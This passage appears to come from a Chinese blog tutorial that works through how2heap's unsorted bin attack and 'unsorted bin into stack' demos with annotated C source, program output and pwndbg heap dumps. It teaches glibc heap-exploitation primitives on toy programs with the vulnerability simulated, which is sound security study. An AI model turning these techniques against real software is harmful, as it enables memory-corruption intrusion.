<span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br>        <span class="hljs-comment">// 我们先在堆上分配一个正常的chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);<br>        <span class="hljs-comment">//并且分配另一个正常的chunk来避免free第一个chunk时该chunk与top chunk合并</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>        <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>        <span class="hljs-built_in">free</span>(p);<br>        <span class="hljs-comment">//现在我们释放的p将会被放入unsorted bin中,并且其bk指向p[1]</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br>                   <span class="hljs-string">&quot;point to %p\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>        p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>        <span class="hljs-comment">//现在我们模拟有一个漏洞让我们可以覆写victim-&gt;bk指针</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">//------------------------------------</span><br><br>        <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>        <span class="hljs-comment">//现在我们再分配一次来取回我们刚刚free掉的chunk,此时攻击目标已经被改写了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br>                   <span class="hljs-string">&quot;rewritten:\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This file demonstrates unsorted bin attack <span class="hljs-keyword">by</span> write a large unsigned <span class="hljs-type">long</span> value <span class="hljs-keyword">into</span> stack<br><span class="hljs-keyword">In</span> practice, unsorted bin attack <span class="hljs-built_in">is</span> generally prepared <span class="hljs-keyword">for</span> further attacks, such <span class="hljs-keyword">as</span> rewriting the <span class="hljs-keyword">global</span> variable global_max_fast <span class="hljs-keyword">in</span> libc <span class="hljs-keyword">for</span> further fastbin attack<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s first look at the target we want to rewrite on stack:</span><br><span class="hljs-number">0</span>x7ffdabb6d048: <span class="hljs-number">0</span><br><br>Now, we allocate first normal chunk <span class="hljs-keyword">on</span> the heap at: <span class="hljs-number">0</span>x16d6010<br><span class="hljs-built_in">And</span> allocate another normal chunk <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> avoid consolidating the top chunk withthe first one during the free()<br><br>We free the first chunk now <span class="hljs-built_in">and</span> it will be inserted <span class="hljs-keyword">in</span> the unsorted bin <span class="hljs-keyword">with</span> its bk pointer point <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x7fb225384b78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br><span class="hljs-built_in">And</span> we write it <span class="hljs-keyword">with</span> the target address-<span class="hljs-number">16</span> (<span class="hljs-keyword">in</span> <span class="hljs-number">32</span>-bits machine, it should be target address-<span class="hljs-number">8</span>):<span class="hljs-number">0</span>x7ffdabb6d038<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been rewritten:</span><br><span class="hljs-number">0</span>x7ffdabb6d048: <span class="hljs-number">0</span>x7fb225384b78<br></code></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>断点位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">9</span>   <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>► <span class="hljs-number">10</span>         <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br><br>► <span class="hljs-number">13</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><br>► <span class="hljs-number">17</span>   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>  <br>  <span class="hljs-number">19</span>   <span class="hljs-built_in">free</span>(p);<br>► <span class="hljs-number">20</span>         <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span><br><br>  <span class="hljs-number">25</span>   p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>► <span class="hljs-number">26</span>         <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-number">31</span>   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>► <span class="hljs-number">32</span>         <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span><br></code></pre></td></tr></table></figure><p>下面我们直接运行看下,首先给定义变量stack_var,赋初值为0</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">pwndbg&gt; p stack_var<br><span class="hljs-meta"><span class="hljs-keyword">$2</span> = 0</span><br>pwndbg&gt; p &amp;stack_var<br><span class="hljs-meta"><span class="hljs-keyword">$3</span> = (unsigned long *) 0x7fffffffe5c8</span><br><br></code></pre></td></tr></table></figure><p>下面malloc一下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">417</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6021a0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134753</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后malloc(500)来防止p free的时候与top chunk合并</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">417</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6021a0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">513</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6023a0</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134241</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后释放p,p被插入到unsortedbin中</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">417</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x602000<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>此时的p[1]</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x p[<span class="hljs-number">1</span>]<br><span class="hljs-number">$5</span> = <span class="hljs-number">0x7ffff7dd1b78</span><br>pwndbg&gt; x/10gx p[<span class="hljs-number">1</span>]<br><span class="hljs-number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;: <span class="hljs-number">0x00000000006023a0</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="hljs-number">104</span>&gt;:        <span class="hljs-number">0x0000000000602000</span>      <span class="hljs-number">0x0000000000602000</span><br><span class="hljs-number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="hljs-number">120</span>&gt;:        <span class="hljs-number">0x00007ffff7dd1b88</span>      <span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba8</span> &lt;main_arena+<span class="hljs-number">136</span>&gt;:        <span class="hljs-number">0x00007ffff7dd1b98</span>      <span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb8</span> &lt;main_arena+<span class="hljs-number">152</span>&gt;:        <span class="hljs-number">0x00007ffff7dd1ba8</span>      <span class="hljs-number">0x00007ffff7dd1ba8</span><br></code></pre></td></tr></table></figure><p>然后给p[1]赋值</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>x602000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">417</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7fffffffe5b8,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br>all [corrupted]<br><span class="hljs-params">FD:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-params">BK:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7fffffffe5b8 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到,我们的bk指针已经被修改为了&amp;stack-2的位置,也就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;stack_var</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">13 = (unsigned long *) 0x7fffffffe5c8</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x  0x7fffffffe5c8- 0x7fffffffe5b8</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">14 = 0x10</span><br></code></pre></td></tr></table></figure><p>然后我们取出我们的unsorted bin</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x stack_var</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">15 = 0x7ffff7dd1b78</span><br></code></pre></td></tr></table></figure><p>可以看到我们的var_stack的值已经被写成了我们unsortedbin(av)的值了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先定义了一个变量stack_var,紧接着malloc了两个chunk</p><p>之后Free掉了第一块chunk,并修改p-&gt;bk&#x3D;&amp;stack_var,这个时候再malloc出来</p><p>然后我们的变量值就被改成了unsorted bin(av)的地址</p><p>在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用</p><h1 id="0x02-unsorted-bin-into-stack"><a href="#0x02-unsorted-bin-into-stack" class="headerlink" title="0x02 unsorted bin into stack"></a>0x02 unsorted bin into stack</h1><h2 id="序-1"><a href="#序-1" class="headerlink" title="序"></a>序</h2><p>这个是unsorted bin attack 的第二例，是修改unsorted bin里chunk的bk指针来达到在栈上malloc出chunk的攻击方式</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>话不多说,我们直接看源码,同样的,我加了些注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>(victim);<br><br>  <span class="hljs-comment">//在栈上伪造一个fake chunk</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>  <span class="hljs-comment">//设置下一次分配的大小并且把bk指针指向任意可写的地址</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>  stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>  stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>  <span class="hljs-comment">//现在假设我们有一个漏洞可以让我们覆写victim-&gt;size和victim-&gt;bk指针</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>  <span class="hljs-comment">//size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ&gt;16 &amp;&amp; 2*SIZE&lt;av-&gt;system-&gt;mem 的检查</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>  victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>  <span class="hljs-comment">//------------------------------------</span><br>  <br>  <span class="hljs-comment">//现在我们就可以返回我们的fake_chunk了</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">root@<span class="hljs-number">284662</span>b4a7a3:~/how2heap/glibc_2<span class="hljs-number">.25</span><span class="hljs-comment"># ./unsorted_bin_into_stack</span><br>Allocating <span class="hljs-keyword">the</span> victim chunk<br>Allocating another chunk <span class="hljs-built_in">to</span> avoid consolidating <span class="hljs-keyword">the</span> top chunk <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> small <span class="hljs-literal">one</span> during <span class="hljs-keyword">the</span> free()<br>Freeing <span class="hljs-keyword">the</span> chunk <span class="hljs-number">0x1078010</span>, <span class="hljs-keyword">it</span> will be inserted <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> unsorted bin<br>Create <span class="hljs-keyword">a</span> fake chunk <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">stackSet</span> <span class="hljs-title">size</span> <span class="hljs-title">for</span> <span class="hljs-title">next</span> <span class="hljs-title">allocation</span> <span class="hljs-title">and</span> <span class="hljs-title">the</span> <span class="hljs-title">bk</span> <span class="hljs-title">pointer</span> <span class="hljs-title">to</span> <span class="hljs-title">any</span> <span class="hljs-title">writable</span> <span class="hljs-title">addressNow</span> <span class="hljs-title">emulating</span> <span class="hljs-title">a</span> <span class="hljs-title">vulnerability</span> <span class="hljs-title">that</span> <span class="hljs-title">can</span> <span class="hljs-title">overwrite</span> <span class="hljs-title">the</span> <span class="hljs-title">victim</span>-&gt;<span class="hljs-title">size</span> <span class="hljs-title">and</span> <span class="hljs-title">victim</span>-&gt;<span class="hljs-title">bk</span> <span class="hljs-title">pointer</span><br>Size should be different <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> next request size <span class="hljs-built_in">to</span> <span class="hljs-literal">return</span> fake_chunk <span class="hljs-keyword">and</span> need <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> check <span class="hljs-number">2</span>*SIZE_SZ (&gt; <span class="hljs-number">16</span> <span class="hljs-keyword">on</span> <span class="hljs-title">x64</span>) &amp;&amp; &lt; <span class="hljs-title">av</span>-&gt;<span class="hljs-title">system_mem</span><br>Now next malloc will <span class="hljs-literal">return</span> <span class="hljs-keyword">the</span> region <span class="hljs-keyword">of</span> our fake chunk: <span class="hljs-number">0x7ffda9d27830</span><br>malloc(<span class="hljs-number">0x100</span>): <span class="hljs-number">0x7ffda9d27830</span><br></code></pre></td></tr></table></figure><h2 id="关键代码调试"><a href="#关键代码调试" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>本例我一共下了五个断点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">12</span>   <span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">13</span><br>► <span class="hljs-number">14</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br><br>  <span class="hljs-number">15</span>   <span class="hljs-built_in">free</span>(victim);<br>  <span class="hljs-number">16</span><br>► <span class="hljs-number">17</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br><br>  <span class="hljs-number">19</span>   stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>  <span class="hljs-number">20</span>   stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br>  <span class="hljs-number">21</span><br>  <span class="hljs-number">22</span>   <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>► <span class="hljs-number">23</span>   <span class="hljs-built_in">fprintf</span>(stderr  , <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>  <br>  <span class="hljs-number">25</span>   victim[<span class="hljs-number">-1</span>] = <span 